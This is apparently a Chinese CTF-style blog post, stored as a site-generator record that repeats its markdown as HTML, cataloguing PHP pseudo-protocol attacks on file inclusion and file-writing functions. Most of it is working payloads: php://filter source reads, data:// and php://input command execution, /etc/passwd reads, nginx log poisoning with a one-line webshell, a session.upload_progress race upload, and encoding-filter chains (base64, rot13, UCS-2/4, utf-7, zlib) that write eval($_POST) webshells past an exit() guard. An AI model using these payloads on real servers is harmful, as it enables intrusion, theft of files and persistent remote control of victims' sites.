include和file_get_contents函数都是支持data伪协议的，这里的data协议用来获取文本数据，然后被include**包含**在当前php文件中，自然而然的就被解析成php代码，而file_get_contents函数只是获取文本的内容，而不是包含，所以没有被解析，从而造成代码执行。\n\n以上两个函数的本地测试只是想说明:\n\n* 存在一部分函数，它们是支持伪协议，并且配合伪协议可以达到一些意想不到的效果。\n* 同样是支持伪协议，但是不同函数的功能配合伪协议产生的效果也会很不一样。\n\n接下来对一些函数配合伪协议达到的妙用进行一个小结。\n\n## include+伪协议\n\n### php://filter/read 协议读源码\n\n姿势：\n\n`ceshi=php://filter/read=convert.base64-encode/resource=flag.php`\n\n`ceshi=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php`\n\n这里的读取出来的编码可以有多种方式（后面看了利用编码写操作就发现多么骚了。），`base64、utf-8、utf-16`等等，有时候会被过滤，换着绕，另外本地测试发现用这个协议的时候，除了convert那里不能动，其他都可以换成大写小写混着，用这个trick可以绕过一些过滤。\n\n### data协议 \n\n可以利用data协议来执行PHP语句:\n\n姿势：\n\n`data://text/plain,<?php system('ls');?>` 这里加不加 //都可。\n\n利用base64编码来绕过\n\n`data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+`  等效于执行 system('ls');\n\n本地测试发现，除了data不能动，其他都可以混用大小写来达到绕过的目的。\n\n### include+php://input\n\n```php\n<?php\n highlight_file(__FILE__);\n $ceshi=$_GET['ceshi'];\n include($ceshi);\n?>\n```\n\n仍然是这个代码，我们可以利用php://input 协议，利用如下：\n\n`?ceshi=php://input`  然后 post 直接传数据  : `<?php system('ls');` ，这里POST数据可控。\n\n不过这里有要求，当编码格式为 `enctype=\"multipart/form-data\"`  php://input是无效的。\n\n关于编码格式的解释，贴上一篇博客。\n\n`https://blog.csdn.net/lingxiyizhi_ljx/article/details/102514560`\n\n### include+file协议\n\n我们这里可以直接用file协议读取本地文件系统的文件，需要使用绝对路径。\n\n`?ceshi=file:///etc/passwd` ，这里前提是文件可访问。\n\n**大小写这个似乎对PHP的版本有要求，不同的版本有的可以，有的不行。**\n\n## include+可控文件\n\n文件包含的本质是包含一些危险代码，或者是webshell，如果一个文件的内容可控，我们包含之，就可以getshell\n\n### 包含日志文件 \n\n我们在UA头那里包含我们的一句话木马，然后包含日志文件，以nginx为例，日志路径为 /var/log/nginx/access.log \n\n![V85BD_E14H_XTZP`6K__XON.png](https://i.loli.net/2020/12/01/NP3yxK8haqInJke.png)\n\n 传过去，然后蚁剑连接，连接路径为 :  `https://127.0.0.1/ceshi.php?file=/var/log/nginx/access.log`\n\n### 利用session.upload_progress \n\n这个思路听说早就有了，但是上上周才接触到，还是学的太少了。\n\n有一篇文章对 `session.upload_progress`讲的挺好，这里贴上链接：`https://www.freebuf.com/news/202819.html)`\n\n简单来说就是上传一个 PHP_SESSION_UPLOAD_PROGRESS 文件，文件内容可以写上我们的shell。然后包含 /tmp/sess_xxx，这里xxx是可控的。然后在利用条件竞争（因为会被删除掉），这里可以直接抓包，利用 intruder模块来进行条件竞争。\n\n附上一个师傅的上传脚本：\n\n```\n#poc.php\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"ip\" method=\"POST\" enctype=\"multipart/form-data\">\n<input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"2333\" />\n<input type=\"file\" name=\"file\" />\n<input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n<?php\n    session_start();\n?>\n```\n\n抓包图：(用的师傅的一张。\n\n![W13K__CM_MV_5V8F_29_VX8.png](https://i.loli.net/2020/12/01/AlEW6mKBDIkzVxg.png)\n\n有时候打不出来，可能是条件竞争没有成功，还没包含就被删掉了，可以考虑线程开大一点。\n\n### 小结\n\ninclude + 伪协议来 getshell ，不局限于这两个文件，只要：\n\n* 文件内容可控\n* 文件可以被访问（也就是可以被包含）\n\n就可以成功getshell。\n\n## file_get_contents + 伪协议\n\n前面的那个本地测试的demo，对 php://filter和data://text 做了说明，其实 file_get_contents还可以结合 php://input\n\ndemo:\n\n```\n\n$user = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$pass = $_GET[\"password\"];  \n  \nif(isset($user)&&(file_get_contents($user,'r')===\"welcome to the bugkuctf\")){  \n    echo \"hello admin!<br>\";  \n    include($file); //hint.php  \n}else{  \n    echo \"you are not admin ! \";  \n}  \n\n```\n\n这里其他不看，单纯来看 `(file_get_contents($user,'r')===\"welcome to the bugkuctf\")` 直接传 $user=\"welcome xxx\" 肯定是不现实的，因为这里是以文件的形式打开，所以我们这里可以尝试 ?user=php://input 然后post数据 welcome to the bugkuctf 即可，post的内容即会被识别为文件内容。\n\n## file_put_content+伪协议\n\n### 写在前面\n\nfile_put_contents 结合伪协议来写马，有着很多很骚的操作，其本质也是大同小异，就是利用过滤器编码来做一些操作。关于file_put_contents结合伪协议的考察，之前也遇到过，一直没有做个总结，现总结如下：\n\n### demo1\n\n```php\n<?php\n highlight_file(__FILE__);\n $filename=$_GET['filename'];\n $content=$_GET['content'];\n file_put_contents($filename,\"<?php exit();\".$content);\n?>\n```\n\n#### 利用base64\n\n这个之前在P牛的文章里面有提到过。原文章链接:\n\n`https://www.leavesongs.com/PENETRATION/php-filter-magic.html`\n\nbase64是每4个字符进行编码，这里的 php exit 一共 7个字符，我们需要手动添上一个字符，剩下的就是我们可控代码了。\n\n`?filename=php://filter/write/convert.base64-decode/resource=1.php&content=XPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs=`  (这里的X是手动添加为了和前面凑8个\n\n![111.png](https://i.loli.net/2020/12/02/rXbgw1MVu6jyHKx.png)\n\n#### 利用rot13\n\n一个在线rot13编码解码的网站：\n\nhttp://www.mxcz.net/tools/rot13.aspx\n\n`?filename=php://filter/write=string.rot13/resource=2.php&content=<?cuc riny($_CBFG['pzq']);`\n\n![112.png](https://i.loli.net/2020/12/02/tUKJwqIxC61O7s4.png)\n\n可以发现成功写入shell，但是有个局限，如果开启了**php短标签**，这个就无效了。就会报错。\n\n#### 利用string.strip_tags结合.htaccess\n\n这个可以过滤掉PHP HTML标签  `<?php ?>` 中内容是可以直接吃完的。\n\n如果是Apache服务器，我们可以配合`.htaccess`文件来包含文件:\n\n`filename=php://filter/write=string.strip_tags/resource=.htaccess&content=>php_value%20auto_prepend_file%20D:\\phpStudy\\PHPTutorial\\WWW\\flag.php`\n\n可以看到成功写入：\n\n![113.png](https://i.loli.net/2020/12/02/kBcJiREuFwdAKS3.png)\n\n然后访问：\n\n![115.png](https://i.loli.net/2020/12/02/UTnmcHASvVEfZqg.png)\n\n该方法适用：\n\n*  PHP5版本可以，PHP7不行，7.3版本已废除这个标签\n* apache环境\n* 文件名以及路径已知\n\n#### 过滤器编码组合\n\n顾名思义，就是利用过滤器的**嵌套**，来实现我们的目的。\n\n还是针对demo1的代码进行测试：\n\n我们传入 `?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=4.php&content=?>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==`\n\n![1.png](https://i.loli.net/2020/12/03/Aqis5nurS2KY9kI.png)\n\n可以看到成功写入。\n\n不过因为  `string.strip_tags`的原因，这个方法在PHP7版本还是会有局限性，但是在PHP5环境下是适用的。\n\n另一种方式，针对PHP7环境下：\n\n`filename=php://filter/write=zlib.deflate|string.tolower|zlib.inflate/resource=5.php&content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0dphpinfo();?>/resource=5.php`  \n\n压缩、转小写、解压，消去死亡exit，成功带入我们的 webshell\n\n![2.png](https://i.loli.net/2020/12/03/opFIQ86Nwlgsfzc.png)\n\n再来看看demo2 ~\n\n### demo2\n\n```php\n<?php\n highlight_file(__FILE__);\n $content=$_GET['content'];\n file_put_contents($content,\"<?php exit();\".$content);\n?>\n```\n\n这个相较于demo1区别是，同一变量。\n\n#### 利用base64\n\n一开始还是想到使用base64编码：\n\n`?content=php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+` 拼接后内容就是\n\n`<?php exit();php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+` 但是没有成功，因为'='在base64编码中代表结束，所以等号后面还接上字母，会报错，转码不出来。\n\n所以这里可以结合 `string.strip_tags` 来去掉等号：\n\n`?content=php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8+.php`\n\n在windows下，这种文件名的存在是很怪异的，但是在linux下测试是可行的：\n\n![3.png](https://i.loli.net/2020/12/03/nm3TNrAQzf5bOEM.png)\n\n当然这个方式还是针对于PHP5\n\n`?content=php://filter/write=string.rot13|<?cuc cucvasb();?>/resource=7.php`\n\n这里我们传过去可以看到：\n\n![4.png](https://i.loli.net/2020/12/03/mKYV2hBXDQvZrgJ.png)\n\n访问 7.php文件，可以看到 phpinfo文件，同理我们可以构造shell\n\n#### 利用rot13\n\n这里我们依然可以利用rot13，`?content=php://filter/write=string.rot13|<?cuc cucvasb();?>|/resource=8.php` \n\n![1233.png](https://i.loli.net/2020/12/04/HZ4ScB3Nv81otGu.png)\n\n可以发现，用rot13成功写入，不过仍然存在短标签的问题。\n\n#### 利用usc-2\n\n通过usc-2编码，两位一反转。\n\n`?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?<hp%20pe@av(l_$OPTSs[m1lp]e;)>?/resource=9.php`\n\n![12.png](https://i.loli.net/2020/12/04/P8xZ2qKNeO9Qwob.png)\n\n可以看到成功写入，并且将前面的死亡代码糅杂消失。\n\n#### 利用usc-4\n\n和usc-2原理基本一致，不过这里是四位一反转。\n\n`?content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?<e@%20p(lavOP_$s[TS]pm1>?;)/resource=10.php`\n\n#### utf-8、utf-7转换\n\n测试发现：\n\n![13.png](https://i.loli.net/2020/12/04/FZmGyCQb5MfnAvO.png)\n\n等号经过`utf-7`编码后会变成 +AD0- ，这样就可以消除等号的影响。并且：\n\n![14.png](https://i.loli.net/2020/12/04/uWVSQyApnEH58hF.png)\n\n纯字符经过 `utf-7` 编码 ，和原来不会有太大区别，所以可以结合 utf7和base64解码来写马\n\n`?content=php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=10.php`\n\n本地可以看到已经成功写入：\n\n![123.png](https://i.loli.net/2020/12/06/CYKxaU7HFZM2diz.png)\n\n### demo3\n\n```php\n<?php\n highlight_file(__FILE__);\n $filename=$_GET['filename'];\n $content=$_GET['content'];\n file_put_contents($filename,$content . \"\\nxxxxxx\");\n?>\n```\n\n其实可以直接写 `?content=<?php phpinfo();?>` 但其实题目一般都会有过滤，可能是过滤掉 起始符号 <? ，这个时候我们可以利用 `.htaccess`\n\n但是 `.htaccess` 文件，对内容要求很严格，多余冗杂的代码会导致文件失效和错误。所以我们考虑注释符。\n\ns1mple师傅的payload:\n\n`?filename=.htaccess&content=php_value%20auto_prepend_file%20D:\\phpStudy\\PHPTutorial\\WWW\\flag.php%0a%23\\`\n\n我自己本地测试发现，在windows下不能使那个换行无效...，而在linux下似乎也不可行。后面有人如果能复现或者自己有思路可以绕过去的，欢迎与我讨论~\n\n参考链接：\n\n`https://xz.aliyun.com/t/8163#toc-2`\n\n\n\n\n\n\n\n","slug":"2020-12-07-php伪协议（转自My0n9s大佬）","published":1,"updated":"2020-12-07T02:56:13.234Z","comments":1,"photos":[],"link":"","_id":"ckkntx9kd0024xov7vcgw4qnu","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近一直忙着考试和学校的各种实验，留的学安全的时间比较少，只能零碎时间来总结一下</p>\n<p>之前护网杯的一道Web题涉及到了这一块，一直想抽时间总结了解一下，一直鸽到现在了。</p>\n<p>废话不多说，这次主要是对文件包含以及相关读写函数的一些利用总结，也对相关姿势进行一下梳理。</p>\n<p>如果文档涉及到知识性的错误，欢迎与我来讨论</p>\n<p>联系方式 <code>512615513@qq.com</code></p>\n<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><p>你需要了解的：</p>\n<ul>\n<li><p>PHP相关函数</p>\n<ul>\n<li>include</li>\n<li>file_get_content</li>\n<li>file_put_content</li>\n<li>……等等</li>\n<li>附图：</li>\n</ul>\n<p><img src=\"https://i.loli.net/2020/12/01/giQoUTpsCf8nmKt.png\" alt=\"BK_7E701ZG321YVC7J9MACP.png\"></p>\n</li>\n<li><p>PHP伪协议</p>\n<ul>\n<li>php://filter</li>\n<li>data://</li>\n<li>file://</li>\n</ul>\n<p>​     等等</p>\n<p><code>https://www.freebuf.com/column/148886.html</code> 对伪协议的一个讲解文章。</p>\n<p>适用环境附图：</p>\n<p><img src=\"https://i.loli.net/2020/12/01/qUmjYXn1ItHBxWT.png\" alt=\"123.png\"></p>\n</li>\n</ul>\n<h2 id=\"本地环境测试\"><a href=\"#本地环境测试\" class=\"headerlink\" title=\"本地环境测试\"></a>本地环境测试</h2><p>在阿清出的一道反序列化的题目中，使用伪协议发现了问题，发现打不通，然后本地测试了一下</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n\n <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$ceshi</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'ceshi'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ceshi</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>配合伪协议<code>php://filter</code>，payload为：<code>http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code> 可以读到base64编码后的flag</p>\n<p>如果换成 <code>$_post['ceshi']</code> 呢，答案是一样的。</p>\n<p>改一下源代码：</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"> <span class=\"token delimiter\">&lt;?php</span>\n <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$ceshi</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'ceshi'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ceshi</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token delimiter\">?></span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>同样我们配合 <code>php://filter</code> 伪协议，payload为：<code>http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code> 可以读到base64编码后的flag，换成POST传参形式亦然。</p>\n<p>然后我们再来尝试一下data协议 (这里测试的时候注意更改一下 php.ini 的配置，默认allow_url_include 是 off)</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$ceshi</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'ceshi'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ceshi</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>利用data:// 伪协议配合include函数可以执行包含文本内容：</p>\n<p><code>ceshi=data:text/plain,helloworld</code></p>\n<p>![BHKG_M9_ZR_8W4K@6PVUS`I.png](<a href=\"https://i.loli.net/2020/11/30/gNRqxLoirwlHF5p.png\" target=\"_blank\" rel=\"noopener\">https://i.loli.net/2020/11/30/gNRqxLoirwlHF5p.png</a>)</p>\n<p>同样，我们利用data://伪协议配合include函数可以执行PHP语句:</p>\n<p><code>ceshi=data:text/plain,&lt;?php phpinfo();?&gt;</code></p>\n<p>![_V8KVS~VX___1`I_2_7V28P.png](<a href=\"https://i.loli.net/2020/11/30/kjOEGUcSZxa3iDm.png\" target=\"_blank\" rel=\"noopener\">https://i.loli.net/2020/11/30/kjOEGUcSZxa3iDm.png</a>)</p>\n<p>如上图，这里本质上是使用data协议 包含了文本内容，文本内容为 <code>&lt;?php phpinfo();?&gt;</code> 然后被解析成PHP语句执行并返回结果。</p>\n<p>我们尝试一下<code>file_get_contents()</code>函数是不是也支持呢？测试一下：</p>\n<p><img src=\"https://i.loli.net/2020/11/30/O7R9PwE8FodH3Da.png\" alt=\"J_C4AEA2CN4TNWJ040_O__P.png\"></p>\n<p>然后我们尝试一下是不是也能支持PHP命令执行。</p>\n<p><img src=\"C:%5CUsers%5C86186%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201130165635700.png\" alt=\"image-20201130165635700\"></p>\n<p>显然，并不如我们想要的那样。</p>\n<p>为什么会出现这种原因，本质上还是在于对函数功能的理解，这两个函数 include和file_get_contents函数都是支持data伪协议的，这里的data协议用来获取文本数据，然后被include<strong>包含</strong>在当前php文件中，自然而然的就被解析成php代码，而file_get_contents函数只是获取文本的内容，而不是包含，所以没有被解析，从而造成代码执行。</p>\n<p>以上两个函数的本地测试只是想说明:</p>\n<ul>\n<li>存在一部分函数，它们是支持伪协议，并且配合伪协议可以达到一些意想不到的效果。</li>\n<li>同样是支持伪协议，但是不同函数的功能配合伪协议产生的效果也会很不一样。</li>\n</ul>\n<p>接下来对一些函数配合伪协议达到的妙用进行一个小结。</p>\n<h2 id=\"include-伪协议\"><a href=\"#include-伪协议\" class=\"headerlink\" title=\"include+伪协议\"></a>include+伪协议</h2><h3 id=\"php-filter-read-协议读源码\"><a href=\"#php-filter-read-协议读源码\" class=\"headerlink\" title=\"php://filter/read 协议读源码\"></a>php://filter/read 协议读源码</h3><p>姿势：</p>\n<p><code>ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code></p>\n<p><code>ceshi=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php</code></p>\n<p>这里的读取出来的编码可以有多种方式（后面看了利用编码写操作就发现多么骚了。），<code>base64、utf-8、utf-16</code>等等，有时候会被过滤，换着绕，另外本地测试发现用这个协议的时候，除了convert那里不能动，其他都可以换成大写小写混着，用这个trick可以绕过一些过滤。</p>\n<h3 id=\"data协议\"><a href=\"#data协议\" class=\"headerlink\" title=\"data协议\"></a>data协议</h3><p>可以利用data协议来执行PHP语句:</p>\n<p>姿势：</p>\n<p><code>data://text/plain,&lt;?php system('ls');?&gt;</code> 这里加不加 //都可。</p>\n<p>利用base64编码来绕过</p>\n<p><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+</code>  等效于执行 system(‘ls’);</p>\n<p>本地测试发现，除了data不能动，其他都可以混用大小写来达到绕过的目的。</p>\n<h3 id=\"include-php-input\"><a href=\"#include-php-input\" class=\"headerlink\" title=\"include+php://input\"></a>include+php://input</h3><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$ceshi</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'ceshi'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ceshi</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>仍然是这个代码，我们可以利用php://input 协议，利用如下：</p>\n<p><code>?ceshi=php://input</code>  然后 post 直接传数据  : <code>&lt;?php system('ls');</code> ，这里POST数据可控。</p>\n<p>不过这里有要求，当编码格式为 <code>enctype=\"multipart/form-data\"</code>  php://input是无效的。</p>\n<p>关于编码格式的解释，贴上一篇博客。</p>\n<p><code>https://blog.csdn.net/lingxiyizhi_ljx/article/details/102514560</code></p>\n<h3 id=\"include-file协议\"><a href=\"#include-file协议\" class=\"headerlink\" title=\"include+file协议\"></a>include+file协议</h3><p>我们这里可以直接用file协议读取本地文件系统的文件，需要使用绝对路径。</p>\n<p><code>?ceshi=file:///etc/passwd</code> ，这里前提是文件可访问。</p>\n<p><strong>大小写这个似乎对PHP的版本有要求，不同的版本有的可以，有的不行。</strong></p>\n<h2 id=\"include-可控文件\"><a href=\"#include-可控文件\" class=\"headerlink\" title=\"include+可控文件\"></a>include+可控文件</h2><p>文件包含的本质是包含一些危险代码，或者是webshell，如果一个文件的内容可控，我们包含之，就可以getshell</p>\n<h3 id=\"包含日志文件\"><a href=\"#包含日志文件\" class=\"headerlink\" title=\"包含日志文件\"></a>包含日志文件</h3><p>我们在UA头那里包含我们的一句话木马，然后包含日志文件，以nginx为例，日志路径为 /var/log/nginx/access.log </p>\n<p>![V85BD_E14H_XTZP`6K__XON.png](<a href=\"https://i.loli.net/2020/12/01/NP3yxK8haqInJke.png\" target=\"_blank\" rel=\"noopener\">https://i.loli.net/2020/12/01/NP3yxK8haqInJke.png</a>)</p>\n<p> 传过去，然后蚁剑连接，连接路径为 :  <code>https://127.0.0.1/ceshi.php?file=/var/log/nginx/access.log</code></p>\n<h3 id=\"利用session-upload-progress\"><a href=\"#利用session-upload-progress\" class=\"headerlink\" title=\"利用session.upload_progress\"></a>利用session.upload_progress</h3><p>这个思路听说早就有了，但是上上周才接触到，还是学的太少了。</p>\n<p>有一篇文章对 <code>session.upload_progress</code>讲的挺好，这里贴上链接：<code>https://www.freebuf.com/news/202819.html)</code></p>\n<p>简单来说就是上传一个 PHP_SESSION_UPLOAD_PROGRESS 文件，文件内容可以写上我们的shell。然后包含 /tmp/sess_xxx，这里xxx是可控的。然后在利用条件竞争（因为会被删除掉），这里可以直接抓包，利用 intruder模块来进行条件竞争。</p>\n<p>附上一个师傅的上传脚本：</p>\n<pre><code>#poc.php\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;form action=\"ip\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n&lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"2333\" /&gt;\n&lt;input type=\"file\" name=\"file\" /&gt;\n&lt;input type=\"submit\" value=\"submit\" /&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&lt;?php\n    session_start();\n?&gt;</code></pre><p>抓包图：(用的师傅的一张。</p>\n<p><img src=\"https://i.loli.net/2020/12/01/AlEW6mKBDIkzVxg.png\" alt=\"W13K__CM_MV_5V8F_29_VX8.png\"></p>\n<p>有时候打不出来，可能是条件竞争没有成功，还没包含就被删掉了，可以考虑线程开大一点。</p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>include + 伪协议来 getshell ，不局限于这两个文件，只要：</p>\n<ul>\n<li>文件内容可控</li>\n<li>文件可以被访问（也就是可以被包含）</li>\n</ul>\n<p>就可以成功getshell。</p>\n<h2 id=\"file-get-contents-伪协议\"><a href=\"#file-get-contents-伪协议\" class=\"headerlink\" title=\"file_get_contents + 伪协议\"></a>file_get_contents + 伪协议</h2><p>前面的那个本地测试的demo，对 php://filter和data://text 做了说明，其实 file_get_contents还可以结合 php://input</p>\n<p>demo:</p>\n<pre><code>\n$user = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$pass = $_GET[\"password\"];  \n\nif(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\")){  \n    echo \"hello admin!&lt;br&gt;\";  \n    include($file); //hint.php  \n}else{  \n    echo \"you are not admin ! \";  \n}  \n</code></pre><p>这里其他不看，单纯来看 <code>(file_get_contents($user,'r')===\"welcome to the bugkuctf\")</code> 直接传 $user=”welcome xxx” 肯定是不现实的，因为这里是以文件的形式打开，所以我们这里可以尝试 ?user=php://input 然后post数据 welcome to the bugkuctf 即可，post的内容即会被识别为文件内容。</p>\n<h2 id=\"file-put-content-伪协议\"><a href=\"#file-put-content-伪协议\" class=\"headerlink\" title=\"file_put_content+伪协议\"></a>file_put_content+伪协议</h2><h3 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h3><p>file_put_contents 结合伪协议来写马，有着很多很骚的操作，其本质也是大同小异，就是利用过滤器编码来做一些操作。关于file_put_contents结合伪协议的考察，之前也遇到过，一直没有做个总结，现总结如下：</p>\n<h3 id=\"demo1\"><a href=\"#demo1\" class=\"headerlink\" title=\"demo1\"></a>demo1</h3><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$content</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"&lt;?php exit();\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"利用base64\"><a href=\"#利用base64\" class=\"headerlink\" title=\"利用base64\"></a>利用base64</h4><p>这个之前在P牛的文章里面有提到过。原文章链接:</p>\n<p><code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></p>\n<p>base64是每4个字符进行编码，这里的 php exit 一共 7个字符，我们需要手动添上一个字符，剩下的就是我们可控代码了。</p>\n<p><code>?filename=php://filter/write/convert.base64-decode/resource=1.php&amp;content=XPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs=</code>  (这里的X是手动添加为了和前面凑8个</p>\n<p><img src=\"https://i.loli.net/2020/12/02/rXbgw1MVu6jyHKx.png\" alt=\"111.png\"></p>\n<h4 id=\"利用rot13\"><a href=\"#利用rot13\" class=\"headerlink\" title=\"利用rot13\"></a>利用rot13</h4><p>一个在线rot13编码解码的网站：</p>\n<p><a href=\"http://www.mxcz.net/tools/rot13.aspx\" target=\"_blank\" rel=\"noopener\">http://www.mxcz.net/tools/rot13.aspx</a></p>\n<p><code>?filename=php://filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG['pzq']);</code></p>\n<p><img src=\"https://i.loli.net/2020/12/02/tUKJwqIxC61O7s4.png\" alt=\"112.png\"></p>\n<p>可以发现成功写入shell，但是有个局限，如果开启了<strong>php短标签</strong>，这个就无效了。就会报错。</p>\n<h4 id=\"利用string-strip-tags结合-htaccess\"><a href=\"#利用string-strip-tags结合-htaccess\" class=\"headerlink\" title=\"利用string.strip_tags结合.htaccess\"></a>利用string.strip_tags结合.htaccess</h4><p>这个可以过滤掉PHP HTML标签  <code>&lt;?php ?&gt;</code> 中内容是可以直接吃完的。</p>\n<p>如果是Apache服务器，我们可以配合<code>.htaccess</code>文件来包含文件:</p>\n<p><code>filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=&gt;php_value%20auto_prepend_file%20D:\\phpStudy\\PHPTutorial\\WWW\\flag.php</code></p>\n<p>可以看到成功写入：</p>\n<p><img src=\"https://i.loli.net/2020/12/02/kBcJiREuFwdAKS3.png\" alt=\"113.png\"></p>\n<p>然后访问：</p>\n<p><img src=\"https://i.loli.net/2020/12/02/UTnmcHASvVEfZqg.png\" alt=\"115.png\"></p>\n<p>该方法适用：</p>\n<ul>\n<li>PHP5版本可以，PHP7不行，7.3版本已废除这个标签</li>\n<li>apache环境</li>\n<li>文件名以及路径已知</li>\n</ul>\n<h4 id=\"过滤器编码组合\"><a href=\"#过滤器编码组合\" class=\"headerlink\" title=\"过滤器编码组合\"></a>过滤器编码组合</h4><p>顾名思义，就是利用过滤器的<strong>嵌套</strong>，来实现我们的目的。</p>\n<p>还是针对demo1的代码进行测试：</p>\n<p>我们传入 